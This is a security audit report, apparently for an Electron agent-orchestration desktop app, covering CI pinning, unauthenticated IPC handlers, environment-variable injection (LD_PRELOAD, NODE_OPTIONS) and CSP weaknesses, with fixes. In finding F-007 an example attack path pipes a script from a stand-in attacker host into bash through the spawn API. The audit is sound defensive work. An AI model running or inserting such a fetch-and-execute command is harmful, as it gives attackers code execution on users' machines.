# Security Review

## Review Date: 2026-05-28

## Findings

### F-001: GitHub Actions Not Pinned to SHA Digests

**Severity**: High
**Status**: Fixed
**Description**: GitHub Actions were referenced by mutable tags (e.g., `v4`) instead of immutable SHA digests. This allows supply chain attacks if a tag is moved to point to malicious code.

**Fix**: All GitHub Actions in `.github/workflows/ci.yml` are now pinned to full SHA digests:
- `actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5` (v4)
- `actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020` (v4)
- `actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02` (v4)

**Verification**: Review `.github/workflows/ci.yml` to confirm all `uses:` directives reference SHA digests with version comments.

### F-002: No Dependency Audit in CI

**Severity**: Medium
**Status**: Fixed
**Description**: CI pipeline did not include dependency vulnerability scanning. Known vulnerabilities in dependencies could be deployed without detection.

**Fix**: Added `npm audit --omit=dev` step in CI pipeline (`jobs.audit`). Runs on every PR and push to main.

**Verification**: Review `.github/workflows/ci.yml` `audit` job configuration.

### F-003: Lock File Not Committed

**Severity**: Medium
**Status**: Fixed
**Description**: `package-lock.json` was not tracked in version control, leading to non-deterministic dependency resolution across environments.

**Fix**: Updated `.gitignore` to ensure `package-lock.json` is tracked. Lock file is committed to the repository.

**Verification**: Run `git status` to confirm `package-lock.json` is tracked.

### F-004: No Branch Protection

**Severity**: High
**Status**: Pending (Requires GitHub Configuration)
**Description**: Main branch has no protection rules. Force pushes and direct commits without review are possible.

**Required Configuration** (via GitHub Settings or API):
1. Require pull request reviews before merging
2. Require status checks to pass (lint, test, build)
3. Require branches to be up to date before merging
4. Prevent force pushes
5. Prevent branch deletion

**Action**: Configure branch protection rules in GitHub repository settings after initial commit and CI workflow is active.

### F-005: No Automated Dependency Updates

**Severity**: Low
**Status**: Fixed
**Description**: Dependencies were manually updated, increasing risk of missing security patches.

**Fix**: Configured Dependabot in `.github/dependabot.yml`:
- Weekly npm dependency updates
- Weekly GitHub Actions updates
- Auto-labeled as `dependencies`

**Verification**: After pushing to GitHub, verify Dependabot PRs are created.

## Recommendations

1. **Enable GitHub Advanced Security** for code scanning and secret scanning
2. **Configure CODEOWNERS** file for automatic review assignments
3. **Add security policy** (SECURITY.md) for vulnerability reporting
4. **Enable commit signing** for verified commits
5. **Review Dependabot alerts** regularly and merge security patches promptly

---

## Electron IPC & Main Process Audit — 2026-05-29

**Scope**: `src/main.ts`, `src/preload.ts`, IPC handlers, agent runtime, auth module, process pool, orchestrator

### Executive Summary

The Electron shell has strong baseline hardening (contextIsolation, sandbox, CSP, navigation blocking), but **most IPC handlers lack authentication**. An attacker who achieves XSS in the renderer gains direct access to process spawning, database CRUD, and orchestration — effectively full host compromise.

**Critical**: 3 | **High**: 2 | **Medium**: 3 | **Low**: 2

---

### F-006: Unauthenticated IPC Handlers (Critical)

**Status**: Open
**Location**: `src/main.ts:218-463`

Only 2 of ~40 IPC handlers call `requireAuth()`:

| Channel | Auth Required |
|---------|--------------|
| `tasks:list` | Yes (`"user"`) |
| `tasks:move` | Yes (`"user"`) |
| `agents:*` (CRUD) | **No** |
| `goals:*` (CRUD) | **No** |
| `tasks:get/create/update/delete` | **No** |
| `task-logs:*` | **No** |
| `runtime:agents:spawn` | **No** |
| `runtime:agents:terminate*` | **No** |
| `orchestration:*` | **No** |
| `cron-schedules:*` | **No** |
| `analytics:*` | **No** |

Any XSS in the renderer escalates to full host control. The auth module exists and works — it's just not wired to most handlers.

**Fix**: Wrap all mutating handlers with `requireAuth()`. At minimum, protect:
- `runtime:agents:spawn` — process execution
- `agents:create/update/delete` — can set `executable_path`
- `orchestration:enqueue` — triggers process spawns
- `cron-schedules:create/update/trigger` — scheduled execution
- `goals:create/update/delete`, `tasks:create/update/delete`, `task-logs:create` — data integrity

---

### F-007: Unauthenticated Process Spawning (Critical)

**Status**: Open
**Location**: `src/main/ipc/controllers/agent.controller.ts:23`, `src/main.ts:365-376`

`runtime:agents:spawn` and `orchestration:enqueue` have no auth checks. The agent runtime has an allowlist and env sanitization, but any renderer code can invoke spawn directly.

**Attack path**:
1. XSS in renderer (e.g., via `script-src 'self' 'unsafe-inline'`)
2. `window.electronAPI.spawnAgent({ executable: "bash", args: ["-c", "curl attacker.com/shell.sh | bash"] })`
3. Arbitrary code execution on host

**Fix**: Require admin auth for `runtime:agents:spawn`, `runtime:agents:terminate*`, and `orchestration:enqueue`.

---

### F-008: ProcessPool Bypasses Env Sanitization (Critical)

**Status**: Fixed
**Location**: `src/main/process-pool.ts:131-136`

`ProcessPool.acquire()` merges env vars directly:
```typescript
env: { ...process.env, ...(env ?? {}) },
```

Unlike `AgentRuntime.spawn()` which calls `sanitizeEnvKeys()`, the pool does **no sanitization**. The orchestrator passes handoff context via env (`TASK_INPUT`), but a malicious agent configuration could inject `LD_PRELOAD`, `NODE_OPTIONS`, or `ELECTRON_RUN_AS_NODE` through the `agents:create` handler (which also lacks auth — see F-006).

**Fix**: Apply `sanitizeEnvKeys()` in `ProcessPool.acquire()` before merging env.

---

### F-009: Shell Interpreters in Executable Allowlist (High)

**Status**: Open
**Location**: `src/main/agent-runtime.ts:16-27`

The allowlist includes `bash`, `sh`, `python`, `python3`, `node` — all general-purpose interpreters. Combined with F-006 (no auth), an attacker can:
```typescript
spawnAgent({ executable: "bash", args: ["-c", "<arbitrary command>"] })
```

**Fix**: Remove `bash`/`sh` from the default allowlist. If needed, gate them behind admin-only access. Keep `claude`, `codex`, `gemini`, `opencode`, `cursor` as the primary agent executables.

---

### F-010: No Rate Limiting on Auth Login (High)

**Status**: Open
**Location**: `src/main/auth.ts:54-103`

`auth:login` has no rate limiting or lockout mechanism. An attacker can brute-force the shared secret via repeated IPC calls. The `timingSafeEqual` prevents timing attacks, but not volume attacks.

**Fix**: Add exponential backoff or lockout after N failed attempts (e.g., 5 failures → 60s cooldown).

---

### F-011: CSP Allows `unsafe-inline` for Scripts (Medium)

**Status**: Open
**Location**: `src/main.ts:25`

`script-src 'self' 'unsafe-inline'` permits inline script execution, which weakens XSS mitigation. If any user-controlled content reaches the DOM, inline scripts will execute.

**Fix**: Use nonces or hashes instead of `'unsafe-inline'`. If the bundler (Vite) supports it, switch to `'strict-dynamic'` with a nonce.

---

### F-012: Analytics API Key Exposed to Renderer (Medium)

**Status**: Open
**Location**: `src/analytics.ts:46-77`, `src/main.ts:237-239`

`analytics:config` returns the PostHog API key to the renderer without auth. While PostHog keys are designed to be public-facing, exposing them via IPC means any XSS can send arbitrary analytics events or pollute data.

**Fix**: Move `track()` and `identify()` calls server-side only. The renderer should send event names/properties, not have direct access to the API key or host config.

---

### F-013: Dev Mode Loads HTTP Without TLS (Medium)

**Status**: Open
**Location**: `src/main.ts:182`

`win.loadURL("http://localhost:5173")` loads over plain HTTP in dev mode. On shared networks, this allows MITM injection of scripts. Dev-only risk.

**Fix**: Use `https://` or configure Vite with TLS for dev. Low priority since this is dev-only.

---

### F-014: Predictable Database Path (Low)

**Status**: Open
**Location**: `src/db/connection.ts:6`

`~/.agentops-desktop/data.db` is a predictable path. A local attacker with read access to the user's home directory can exfiltrate the database.

**Fix**: Set restrictive file permissions (0600) on the database file after creation.

---

### F-015: Session Tokens Stored in Memory Only (Low)

**Status**: Open
**Location**: `src/main/auth.ts:29`

Sessions are stored in a `Map<string, Session>` in process memory. Tokens are lost on app restart (expected), but also vulnerable to heap dumps or memory inspection. Low risk for a desktop app.

---

## Positive Controls (Electron)

The codebase has several strong security controls already in place:

1. **`contextIsolation: true` + `sandbox: true`** — prevents renderer from accessing Node.js APIs directly
2. **`nodeIntegration: false`** — standard Electron security baseline
3. **CSP header applied via `onHeadersReceived`** — covers all responses
4. **Navigation blocking** — `will-navigate` prevents phishing via links
5. **`window.open()` denied** — blocks popup-based attacks
6. **Webview disabled** — `will-attach-webview` prevented
7. **Permission requests blocked** — camera/mic/geolocation denied
8. **`timingSafeEqual`** for secret comparison — prevents timing attacks
9. **Env sanitization in `AgentRuntime.spawn()`** — blocks `LD_PRELOAD`, `NODE_OPTIONS`, etc.
10. **Executable allowlist** — restricts which binaries can be spawned
11. **`shell: false`** in spawn calls — prevents shell injection
12. **Input validation on agent CRUD** — path traversal, null bytes, length limits
13. **Audit logging** — all spawn attempts logged to `~/.agentops/logs/agent-spawn.log`

---

## IPC Channel Inventory

### Unauthenticated (renderer-accessible without token)

| Channel | Type | Risk Level |
|---------|------|-----------|
| `app:version` | Read | Low |
| `app:platform` | Read | Low |
| `auth:status` | Read | Low |
| `auth:login` | Mutation | Medium |
| `auth:logout` | Mutation | Low |
| `analytics:config` | Read | Medium |
| `analytics:track` | Mutation | Medium |
| `analytics:identify` | Mutation | Medium |
| `analytics:optOut/In` | Mutation | Low |
| `agents:list/get` | Read | Medium |
| `agents:create/update/delete` | Mutation | **Critical** |
| `goals:*` | Read/Mutation | Medium |
| `tasks:get/create/update/delete` | Read/Mutation | High |
| `task-logs:*` | Read/Mutation | Medium |
| `tasks:getOutput` | Read | Medium |
| `tasks:setDependencies` | Mutation | Medium |
| `task-handoffs:*` | Read | Medium |
| `runtime:agents:spawn` | **Process exec** | **Critical** |
| `runtime:agents:list` | Read | Medium |
| `runtime:agents:terminate*` | **Process kill** | **Critical** |
| `runtime:agents:allowedExecutables` | Read | Low |
| `agent:health-check` | Process exec | High |
| `orchestration:enqueue` | Process exec | **Critical** |
| `orchestration:cancel` | Process kill | High |
| `orchestration:status` | Read | Low |
| `orchestration:setMaxParallel` | Config | Medium |
| `cron-schedules:*` | Read/Mutation | High |

### Authenticated (require session token)

| Channel | Required Role |
|---------|--------------|
| `tasks:list` | `user` |
| `tasks:move` | `user` |

---

## Priority Remediation Plan

| Priority | Finding | Effort | Fix |
|----------|---------|--------|-----|
| P0 | F-006 | Medium | Add `requireAuth()` to all mutating IPC handlers |
| P0 | F-007 | Low | Gate `runtime:agents:spawn` behind admin auth |
| P0 | F-008 | Low | Apply `sanitizeEnvKeys()` in `ProcessPool.acquire()` |
| P1 | F-009 | Low | Remove `bash`/`sh` from default allowlist |
| P1 | F-010 | Medium | Add login rate limiting |
| P2 | F-011 | Medium | Replace `'unsafe-inline'` with nonce-based CSP |
| P2 | F-012 | Low | Move analytics API key out of renderer-accessible config |
| P3 | F-013 | Low | Use HTTPS for dev server |
| P3 | F-014 | Low | Set 0600 permissions on DB file |
